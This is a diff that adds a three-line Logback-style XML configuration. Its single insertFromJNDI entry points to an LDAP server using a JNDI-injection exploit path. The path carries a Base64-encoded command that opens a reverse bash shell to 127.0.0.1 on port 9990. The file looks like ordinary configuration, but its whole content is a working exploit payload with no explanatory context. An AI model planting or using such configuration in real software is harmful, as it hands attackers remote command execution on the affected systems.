@@ -1,0 +1,3 @@
+<configuration>
+    <insertFromJNDI env-entry-name="ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJi9kZXYvdGNwLzEyNy4wLjAuMS85OTkwIDA%2BJjE=" as="appName" />
+</configuration>
